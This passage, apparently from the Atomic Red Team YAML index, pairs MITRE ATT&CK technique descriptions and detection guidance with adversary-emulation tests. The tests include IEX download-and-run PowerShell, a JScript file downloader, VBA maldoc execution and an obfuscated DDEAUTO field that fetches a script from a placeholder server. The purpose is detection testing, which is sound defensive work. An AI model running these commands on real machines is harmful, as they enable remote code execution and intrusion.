      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1059.007:
    technique:
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Cody Thomas, SpecterOps
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--0f4a0c76-ab2d-4cb0-85d3-3f0efb8cba0d
      type: attack-pattern
      created: '2020-06-23T19:12:24.924Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1059.007
        url: https://attack.mitre.org/techniques/T1059/007
      - source_name: NodeJS
        url: https://nodejs.org/
        description: OpenJS Foundation. (n.d.). Node.js. Retrieved June 23, 2020.
      - source_name: JScrip May 2018
        url: https://docs.microsoft.com/windows/win32/com/translating-to-jscript
        description: Microsoft. (2018, May 31). Translating to JScript. Retrieved
          June 23, 2020.
      - source_name: Microsoft JScript 2007
        url: https://docs.microsoft.com/archive/blogs/gauravseth/the-world-of-jscript-javascript-ecmascript
        description: Microsoft. (2007, August 15). The World of JScript, JavaScript,
          ECMAScript …. Retrieved June 23, 2020.
      - source_name: Microsoft Windows Scripts
        url: https://docs.microsoft.com/scripting/winscript/windows-script-interfaces
        description: Microsoft. (2017, January 18). Windows Script Interfaces. Retrieved
          June 23, 2020.
      - source_name: Apple About Mac Scripting 2016
        url: https://developer.apple.com/library/archive/documentation/LanguagesUtilities/Conceptual/MacAutomationScriptingGuide/index.html
        description: Apple. (2016, June 13). About Mac Scripting. Retrieved April
          14, 2021.
      - source_name: SpecterOps JXA 2020
        url: https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5
        description: Pitt, L. (2020, August 6). Persistent JXA. Retrieved April 14,
          2021.
      - source_name: SentinelOne macOS Red Team
        url: https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/
        description: 'Phil Stokes. (2019, December 5). macOS Red Team: Calling Apple
          APIs Without Building Binaries. Retrieved July 17, 2020.'
      - source_name: Red Canary Silver Sparrow Feb2021
        url: https://redcanary.com/blog/clipping-silver-sparrows-wings/
        description: 'Tony Lambert. (2021, February 18). Clipping Silver Sparrow’s
          wings: Outing macOS malware before it takes flight. Retrieved April 20,
          2021.'
      - source_name: MDSec macOS JXA and VSCode
        url: https://www.mdsec.co.uk/2021/01/macos-post-exploitation-shenanigans-with-vscode-extensions/
        description: Dominic Chell. (2021, January 1). macOS Post-Exploitation Shenanigans
          with VSCode Extensions. Retrieved April 20, 2021.
      modified: '2021-08-16T21:02:05.142Z'
      name: 'Command and Scripting Interpreter: JavaScript'
      description: |-
        Adversaries may abuse various implementations of JavaScript for execution. JavaScript (JS) is a platform-independent scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.(Citation: NodeJS)

        JScript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the [Component Object Model](https://attack.mitre.org/techniques/T1559/001) and Internet Explorer HTML Application (HTA) pages.(Citation: JScrip May 2018)(Citation: Microsoft JScript 2007)(Citation: Microsoft Windows Scripts)

        JavaScript for Automation (JXA) is a macOS scripting language based on JavaScript, included as part of Apple’s Open Scripting Architecture (OSA), that was introduced in OSX 10.10. Apple’s OSA provides scripting capabilities to control applications, interface with the operating system, and bridge access into the rest of Apple’s internal APIs. As of OSX 10.10, OSA only supports two languages, JXA and [AppleScript](https://attack.mitre.org/techniques/T1059/002). Scripts can be executed via the command line utility <code>osascript</code>, they can be compiled into applications or script files via <code>osacompile</code>, and they can be compiled and executed in memory of other programs by leveraging the OSAKit Framework.(Citation: Apple About Mac Scripting 2016)(Citation: SpecterOps JXA 2020)(Citation: SentinelOne macOS Red Team)(Citation: Red Canary Silver Sparrow Feb2021)(Citation: MDSec macOS JXA and VSCode)

        Adversaries may abuse various implementations of JavaScript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) or downloading and executing these script files as secondary payloads. Since these payloads are text-based, it is also very common for adversaries to obfuscate their content as part of [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027).
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: |-
        Monitor for events associated with scripting execution, such as process activity, usage of the Windows Script Host (typically cscript.exe or wscript.exe), file activity involving scripts, or loading of modules associated with scripting languages (ex: JScript.dll). Scripting execution is likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other programmable post-compromise behaviors and could be used as indicators of detection leading back to the source.

        Monitor for execution of JXA through <code>osascript</code> and usage of <code>OSAScript</code> API that may be related to other suspicious behavior occurring on the system.

        Understanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable related components running on a system would be considered suspicious. If scripting is not commonly used on a system, but enabled, execution running out of cycle from patching or other administrator functions is suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.
      x_mitre_is_subtechnique: true
      x_mitre_version: '2.1'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Module: Module Load'
      - 'Script: Script Execution'
      - 'Command: Command Execution'
      - 'Process: Process Creation'
      x_mitre_permissions_required:
      - User
      - Administrator
      - SYSTEM
      identifier: T1059.007
    atomic_tests:
    - name: JScript execution to gather local computer information via cscript
      auto_generated_guid: 01d75adf-ca1b-4dd1-ac96-7c9550ad1035
      description: JScript execution test, execute JScript via cscript command. When
        successful, system information will be written to $env:TEMP\T1059.007.out.txt
      supported_platforms:
      - windows
      input_arguments:
        jscript:
          description: Path to sample script
          type: string
          default: PathToAtomicsFolder\T1059.007\src\sys_info.js
      dependency_executor_name: powershell
      dependencies:
      - description: Sample script must exist on disk at specified location (#{jscript})
        prereq_command: 'if (Test-Path #{jscript}) {exit 0} else {exit 1} '
        get_prereq_command: |-
          New-Item -ItemType Directory (Split-Path #{jscript}) -Force | Out-Null
          Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/sys_info.js" -OutFile "#{jscript}"
      executor:
        command: 'cscript #{jscript} > $env:TEMP\T1059.007.out.txt'''
        cleanup_command: Remove-Item $env:TEMP\T1059.007.out.txt -ErrorAction Ignore
        name: command_prompt
    - name: JScript execution to gather local computer information via wscript
      auto_generated_guid: '0709945e-4fec-4c49-9faf-c3c292a74484'
      description: JScript execution test, execute JScript via wscript command. When
        successful, system information will be shown with four message boxes.
      supported_platforms:
      - windows
      input_arguments:
        jscript:
          description: Path to sample script
          type: string
          default: PathToAtomicsFolder\T1059.007\src\sys_info.js
      dependency_executor_name: powershell
      dependencies:
      - description: Sample script must exist on disk at specified location (#{jscript})
        prereq_command: 'if (Test-Path #{jscript}) {exit 0} else {exit 1} '
        get_prereq_command: |-
          New-Item -ItemType Directory (Split-Path #{jscript}) -Force | Out-Null
          Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/sys_info.js" -OutFile "#{jscript}"
      executor:
        command: 'wscript #{jscript}'
        name: command_prompt
  T1053.007:
    technique:
      modified: '2023-04-15T16:23:05.392Z'
      name: Kubernetes Cronjob
      description: |-
        Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.

        In Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: privilege-escalation
      x_mitre_contributors:
      - Center for Threat-Informed Defense (CTID)
      - Vishwas Manral, McAfee
      - Yossi Weizman, Azure Defender Research Team
      x_mitre_deprecated: false
      x_mitre_detection: 'Monitor for the anomalous creation of scheduled jobs in
        container orchestration environments. Use logging agents on Kubernetes nodes
        and retrieve logs from sidecar proxies for application and resource pods to
        monitor malicious container orchestration job deployments. '
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Containers
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Container: Container Creation'
      - 'Scheduled Job: Scheduled Job Creation'
      - 'File: File Creation'
      x_mitre_permissions_required:
      - User
      x_mitre_remote_support: true
      type: attack-pattern
      id: attack-pattern--1126cab1-c700-412f-a510-61f4937bb096
      created: '2021-03-29T17:06:22.247Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1053/007
        external_id: T1053.007
      - source_name: Kubernetes CronJob
        description: The Kubernetes Authors. (n.d.). Kubernetes CronJob. Retrieved
          March 29, 2021.
        url: https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/
      - source_name: Kubernetes Jobs
        description: The Kubernetes Authors. (n.d.). Kubernetes Jobs. Retrieved March
          30, 2021.
        url: https://kubernetes.io/docs/concepts/workloads/controllers/job/
      - source_name: Threat Matrix for Kubernetes
        description: Weizman, Y. (2020, April 2). Threat Matrix for Kubernetes. Retrieved
          March 30, 2021.
        url: https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1053.007
    atomic_tests:
    - name: ListCronjobs
      auto_generated_guid: ddfb0bc1-3c3f-47e9-a298-550ecfefacbd
      description: 'Kubernetes Job is a controller that creates one or more pods and
        ensures that a specified number of them successfully terminate. Kubernetes
        Job can be used to run containers that perform finite tasks for batch jobs.
        Kubernetes CronJob is used to schedule Jobs. Attackers may use Kubernetes
        CronJob for scheduling execution of malicious code that would run as a container
        in the cluster.

        '
      supported_platforms:
      - containers
      input_arguments:
        namespace:
          description: K8s namespace to list
          type: string
          default: default
      dependencies:
      - description: 'kubectl must be installed

          '
        get_prereq_command: 'echo "kubectl must be installed manually"

          '
        prereq_command: 'which kubectl

          '
      executor:
        command: 'kubectl get cronjobs -n #{namespace}

          '
        name: bash
        elevation_required: false
    - name: CreateCronjob
      auto_generated_guid: f2fa019e-fb2a-4d28-9dc6-fd1a9b7f68c3
      description: 'Kubernetes Job is a controller that creates one or more pods and
        ensures that a specified number of them successfully terminate. Kubernetes
        Job can be used to run containers that perform finite tasks for batch jobs.
        Kubernetes CronJob is used to schedule Jobs. Attackers may use Kubernetes
        CronJob for scheduling execution of malicious code that would run as a container
        in the cluster.

        '
      supported_platforms:
      - containers
      input_arguments:
        namespace:
          description: K8s namespace to list
          type: string
          default: default
      dependencies:
      - description: 'kubectl must be installed

          '
        get_prereq_command: 'echo "kubectl must be installed manually"

          '
        prereq_command: 'which kubectl

          '
      executor:
        command: 'kubectl create -f src/cronjob.yaml -n #{namespace}

          '
        cleanup_command: 'kubectl delete cronjob art -n #{namespace}

          '
        name: bash
        elevation_required: false
  T1121:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      x_mitre_contributors:
      - Casey Smith
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--215190a9-9f02-4e83-bb5f-e0589965a302
      type: attack-pattern
      created: '2017-05-31T21:31:33.499Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        external_id: T1121
        url: https://attack.mitre.org/techniques/T1121
      - url: https://msdn.microsoft.com/en-us/library/04za0hca.aspx
        description: Microsoft. (n.d.). Regsvcs.exe (.NET Services Installation Tool).
          Retrieved July 1, 2016.
        source_name: MSDN Regsvcs
      - source_name: MSDN Regasm
        description: Microsoft. (n.d.). Regasm.exe (Assembly Registration Tool). Retrieved
          July 1, 2016.
        url: https://msdn.microsoft.com/en-us/library/tzat5yw6.aspx
      - source_name: LOLBAS Regsvcs
        url: https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/
        description: LOLBAS. (n.d.). Regsvcs.exe. Retrieved July 31, 2019.
      - description: LOLBAS. (n.d.). Regasm.exe. Retrieved July 31, 2019.
        url: https://lolbas-project.github.io/lolbas/Binaries/Regasm/
        source_name: LOLBAS Regasm
      modified: '2020-01-31T19:00:30.734Z'
      name: Regsvcs/Regasm
      description: |-
        Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft. (Citation: MSDN Regsvcs) (Citation: MSDN Regasm)

        Adversaries can use Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Both utilities may be used to bypass process whitelisting through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>[ComRegisterFunction]</code> or <code>[ComUnregisterFunction]</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute. (Citation: LOLBAS Regsvcs)(Citation: LOLBAS Regasm)
      kill_chain_phases:
      - phase_name: defense-evasion
        kill_chain_name: mitre-attack
      - phase_name: execution
        kill_chain_name: mitre-attack
      x_mitre_detection: Use process monitoring to monitor the execution and arguments
        of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and
        Regasm.exe with prior history of known good arguments and executed binaries
        to determine anomalous and potentially adversarial activity. Command arguments
        used before and after Regsvcs.exe or Regasm.exe invocation may also be useful
        in determining the origin and purpose of the binary being executed.
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_defense_bypassed:
      - Process whitelisting
      - Digital Certificate Validation
      x_mitre_permissions_required:
      - User
      - Administrator
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1559.002:
    technique:
      x_mitre_platforms:
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--232a7e42-cd6e-4902-8fe9-2960f529dd4d
      type: attack-pattern
      created: '2020-02-12T14:10:50.699Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        external_id: T1559.002
        url: https://attack.mitre.org/techniques/T1559/002
      - url: https://www.bleepingcomputer.com/news/microsoft/microsoft-disables-dde-feature-in-word-to-prevent-further-malware-attacks/
        description: Cimpanu, C. (2017, December 15). Microsoft Disables DDE Feature
          in Word to Prevent Further Malware Attacks. Retrieved December 19, 2017.
        source_name: BleepingComputer DDE Disabled in Word Dec 2017
      - url: https://portal.msrc.microsoft.com/security-guidance/advisory/ADV170021
        description: Microsoft. (2017, December 12). ADV170021 - Microsoft Office
          Defense in Depth Update. Retrieved February 3, 2018.
        source_name: Microsoft ADV170021 Dec 2017
      - url: https://technet.microsoft.com/library/security/4053440
        description: Microsoft. (2017, November 8). Microsoft Security Advisory 4053440
          - Securely opening Microsoft Office documents that contain Dynamic Data
          Exchange (DDE) fields. Retrieved November 21, 2017.
        source_name: Microsoft DDE Advisory Nov 2017
      - url: https://sensepost.com/blog/2016/powershell-c-sharp-and-dde-the-power-within/
        description: El-Sherei, S. (2016, May 20). PowerShell, C-Sharp and DDE The
          Power Within. Retrieved November 22, 2017.
        source_name: SensePost PS DDE May 2016
      - url: https://www.contextis.com/blog/comma-separated-vulnerabilities
        description: Kettle, J. (2014, August 29). Comma Separated Vulnerabilities.
          Retrieved November 22, 2017.
        source_name: Kettle CSV DDE Aug 2014
      - url: https://posts.specterops.io/reviving-dde-using-onenote-and-excel-for-code-execution-d7226864caee
        description: 'Nelson, M. (2018, January 29). Reviving DDE: Using OneNote and
          Excel for Code Execution. Retrieved February 3, 2018.'
        source_name: Enigma Reviving DDE Jan 2018
      - url: https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
        description: Stalmans, E., El-Sherei, S. (2017, October 9). Macro-less Code
          Exec in MSWord. Retrieved November 21, 2017.
        source_name: SensePost MacroLess DDE Oct 2017
      - source_name: OWASP CSV Injection
        url: https://owasp.org/www-community/attacks/CSV_Injection
        description: " Albinowax Timo Goosen. (n.d.). CSV Injection. Retrieved February
          7, 2022."
      - source_name: 'CSV Excel Macro Injection '
        url: https://blog.securelayer7.net/how-to-perform-csv-excel-macro-injection/
        description: " Ishaq Mohammed . (2021, January 10). Everything about CSV Injection
          and CSV Excel Macro Injection. Retrieved February 7, 2022."
      - source_name: Fireeye Hunting COM June 2019
        url: https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html
        description: Hamilton, C. (2019, June 4). Hunting COM Objects. Retrieved June
          10, 2019.
      - url: https://blog.nviso.be/2017/10/11/detecting-dde-in-ms-office-documents/
        description: NVISO Labs. (2017, October 11). Detecting DDE in MS Office documents.
          Retrieved November 21, 2017.
        source_name: NVisio Labs DDE Detection Oct 2017
      modified: '2022-02-22T13:22:30.191Z'
      name: 'Inter-Process Communication: Dynamic Data Exchange'
      description: |-
        Adversaries may use Windows Dynamic Data Exchange (DDE) to execute arbitrary commands. DDE is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of strings, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

        Object Linking and Embedding (OLE), or the ability to link data between documents, was originally implemented through DDE. Despite being superseded by [Component Object Model](https://attack.mitre.org/techniques/T1559/001), DDE may be enabled in Windows 10 and most of Microsoft Office 2016 via Registry keys.(Citation: BleepingComputer DDE Disabled in Word Dec 2017)(Citation: Microsoft ADV170021 Dec 2017)(Citation: Microsoft DDE Advisory Nov 2017)

        Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via [Phishing](https://attack.mitre.org/techniques/T1566) campaigns or hosted Web content, avoiding the use of Visual Basic for Applications (VBA) macros.(Citation: SensePost PS DDE May 2016)(Citation: Kettle CSV DDE Aug 2014)(Citation: Enigma Reviving DDE Jan 2018)(Citation: SensePost MacroLess DDE Oct 2017) Similarly, adversaries may infect payloads to execute applications and/or commands on a victim device by way of embedding DDE formulas within a CSV file intended to be opened through a Windows spreadsheet program.(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )

        DDE could also be leveraged by an adversary operating on a compromised machine who does not have direct access to a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059). DDE execution can be invoked remotely via [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting COM June 2019)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_detection: |-
        Monitor processes for abnormal behavior indicative of DDE abuse, such as Microsoft Office applications loading DLLs and other modules not typically associated with the application or these applications spawning unusual processes (such as cmd.exe).

        OLE, Office Open XML, CSV, and other files can be scanned for ‘DDEAUTO', ‘DDE’, and other strings indicative of DDE execution.(Citation: NVisio Labs DDE Detection Oct 2017)(Citation: OWASP CSV Injection)(Citation: CSV Excel Macro Injection )
      x_mitre_is_subtechnique: true
      x_mitre_version: '1.2'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_data_sources:
      - 'Script: Script Execution'
      - 'Process: Process Creation'
      - 'Module: Module Load'
      x_mitre_permissions_required:
      - User
      x_mitre_remote_support: true
      identifier: T1559.002
    atomic_tests:
    - name: Execute Commands
      auto_generated_guid: f592ba2a-e9e8-4d62-a459-ef63abd819fd
      description: 'Executes commands via DDE using Microsfot Word

        '
      supported_platforms:
      - windows
      executor:
        steps: |
          Open Microsoft Word

          Insert tab -> Quick Parts -> Field

          Choose = (Formula) and click ok.

          After that, you should see a Field inserted in the document with an error "!Unexpected End of Formula", right-click the Field, and choose Toggle Field Codes.

          The Field Code should now be displayed, change it to Contain the following:

          {DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"  }
        name: manual
    - name: Execute PowerShell script via Word DDE
      auto_generated_guid: 47c21fb6-085e-4b0d-b4d2-26d72c3830b3
      description: 'When the word document opens it will prompt the user to click
        ok on a dialogue box, then attempt to run PowerShell with DDEAUTO to download
        and execute a powershell script

        '
      supported_platforms:
      - windows
      executor:
        command: 'start $PathToAtomicsFolder\T1559.002\bin\DDE_Document.docx

          '
        name: command_prompt
    - name: DDEAUTO
      auto_generated_guid: cf91174c-4e74-414e-bec0-8d60a104d181
      description: |2

        TrustedSec - Unicorn - https://github.com/trustedsec/unicorn

        SensePost DDEAUTO - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/

        Word VBA Macro

        [Dragon's Tail](https://github.com/redcanaryco/atomic-red-team/tree/master/ARTifacts/Adversary/Dragons_Tail)
      supported_platforms:
      - windows
      executor:
        steps: |
          1. Open Word

          2. Insert tab -> Quick Parts -> Field

          3. Choose = (Formula) and click ok.

          4. Once the field is inserted, you should now see "!Unexpected End of Formula"

          5. Right-click the Field, choose "Toggle Field Codes"

          6. Paste in the code from Unicorn or SensePost

          7. Save the Word document.

          9. DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"

          10. DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\v1.0\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # " "Microsoft Document Security Add-On"
        name: manual
  T1204.002:
    technique:
      modified: '2023-04-21T12:22:19.740Z'
      name: 'User Execution: Malicious File'
      description: "An adversary may rely upon a user opening a malicious file in
        order to gain execution. Users may be subjected to social engineering to get
        them to open a file that will lead to code execution. This user action will
        typically be observed as follow-on behavior from [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001).
        Adversaries may use several types of files that require a user to execute
        them, including .doc, .pdf, .xls, .rtf, .scr, .exe, .lnk, .pif, and .cpl.\n\nAdversaries
        may employ various forms of [Masquerading](https://attack.mitre.org/techniques/T1036)
        and [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)
        to increase the likelihood that a user will open and successfully execute
        a malicious file. These methods may include using a familiar naming convention
        and/or password protecting the file and supplying instructions to a user on
        how to open it.(Citation: Password Protected Word Docs) \n\nWhile [Malicious
        File](https://attack.mitre.org/techniques/T1204/002) frequently occurs shortly
        after Initial Access it may occur at other phases of an intrusion, such as
        when an adversary places a file in a shared directory or on a user's desktop
        hoping that a user will click on it. This activity may also be seen shortly
        after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534)."
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: execution
      x_mitre_contributors:
      - TruKno
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Monitor the execution of and command-line arguments for applications that may be used by an adversary to gain initial access that require user interaction. This includes compression applications, such as those for zip files, that can be used to [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140) in payloads.

        Anti-virus can potentially detect malicious documents and files that are downloaded and executed on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the file is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning powershell.exe).
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_version: '1.3'
      x_mitre_data_sources:
      - 'Process: Process Creation'
      - 'File: File Creation'
      x_mitre_remote_support: false
      type: attack-pattern
      id: attack-pattern--232b7f21-adf9-4b42-b936-b9d6f7df856e
      created: '2020-03-11T14:49:36.954Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1204/002
        external_id: T1204.002
      - source_name: Password Protected Word Docs
        description: 'Lawrence Abrams. (2017, July 12). PSA: Don''t Open SPAM Containing
          Password Protected Word Docs. Retrieved January 5, 2022.'
        url: https://www.bleepingcomputer.com/news/security/psa-dont-open-spam-containing-password-protected-word-docs/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      identifier: T1204.002
    atomic_tests:
    - name: OSTap Style Macro Execution
      auto_generated_guid: 8bebc690-18c7-4549-bc98-210f7019efff
      description: |
        This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.
        Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
        This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.
        References:
          https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader
      supported_platforms:
      - windows
      input_arguments:
        jse_path:
          description: 'Path for the macro to write out the "malicious" .jse file

            '
          type: string
          default: C:\Users\Public\art.jse
        ms_product:
          description: Maldoc application Word or Excel
          type: string
          default: Word
      dependency_executor_name: powershell
      dependencies:
      - description: 'Microsoft #{ms_product} must be installed

          '
        prereq_command: |
          try {
            New-Object -COMObject "#{ms_product}.Application" | Out-Null
            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
            Stop-Process -Name $process
            exit 0
          } catch { exit 1 }
        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
          manually to meet this requirement"

          '
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
          $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"cscript.exe #{jse_path}`"`n"
          Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
        cleanup_command: 'Remove-Item #{jse_path} -ErrorAction Ignore

          '
        name: powershell
    - name: OSTap Payload Download
      auto_generated_guid: 3f3af983-118a-4fa1-85d3-ba4daa739d80
      description: 'Uses cscript //E:jscript to download a file

        '
      supported_platforms:
      - windows
      input_arguments:
        script_file:
          description: File to execute jscript code from
          type: path
          default: "%TEMP%\\OSTapGet.js"
        file_url:
          description: URL to retrieve file from
          type: url
          default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
      executor:
        command: |
          echo var url = "#{file_url}", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile(filename, 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > #{script_file}
          cscript //E:Jscript #{script_file}
        cleanup_command: 'del #{script_file} /F /Q >nul 2>&1

          '
        name: command_prompt
    - name: Maldoc choice flags command execution
      auto_generated_guid: 0330a5d2-a45a-4272-a9ee-e364411c4b18
      description: |
        This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.
        Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
      supported_platforms:
      - windows
      input_arguments:
        ms_product:
          description: Maldoc application Word or Excel
          type: string
          default: Word
      dependency_executor_name: powershell
      dependencies:
      - description: 'Microsoft #{ms_product} must be installed

          '
        prereq_command: |
          try {
            New-Object -COMObject "#{ms_product}.Application" | Out-Null
            $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
            Stop-Process -Name $process
            exit 0
          } catch { exit 1 }
        get_prereq_command: 'Write-Host "You will need to install Microsoft #{ms_product}
          manually to meet this requirement"

          '
      executor:
        command: |
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
          $macrocode = "  a = Shell(`"cmd.exe /c choice /C Y /N /D Y /T 3`", vbNormalFocus)"
          Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
        name: powershell
    - name: OSTAP JS version
      auto_generated_guid: add560ef-20d6-4011-a937-2c340f930911
      description: |
        Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript
        Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
      supported_platforms:
      - windows
      input_arguments:
        jse_path:
          description: jse file to execute with wscript
          type: path
